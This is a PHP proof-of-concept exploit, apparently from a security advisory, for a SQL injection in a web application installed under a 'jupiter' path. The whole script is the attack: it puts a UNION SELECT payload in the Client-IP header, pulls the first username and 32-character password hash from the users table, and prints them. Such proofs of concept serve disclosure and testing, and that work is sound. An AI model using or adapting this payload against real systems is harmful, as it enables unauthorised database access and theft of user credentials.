# SQL Injection Vulnerability (POC #1)
#
require("phpsploitclass.php");  # See [1]
error_reporting(E_ALL ^ E_NOTICE);
$url = 'http://localhost/jupiter/';

$xpl = new phpsploit();
$xpl->agent("Mozilla");
$hev =  "-1' UNION SELECT CONCAT('"
       ."[BEGIN_XPL_USER]',"
       ."(SELECT username FROM users LIMIT 0,1),'"
       ."[END_XPL_USER]','"
       ."[BEGIN_XPL_PWD]',"
       ."(SELECT password FROM users LIMIT 0,1),'"
       ."[END_XPL_PWD]'),1 #";

$xpl->addheader("Client-IP",$hev);
$xpl->get($url);
preg_match("#\[BEGIN_XPL_USER\](.*)\[END_XPL_USER\]#",$xpl->getcontent(),$usr);
preg_match("#\[BEGIN_XPL_PWD\]([a-z0-9]{32})\[END_XPL_PWD\]#",$xpl->getcontent(),$pwd);
print $usr[1].'::'.$pwd[1];
#
# EOF POC #1 

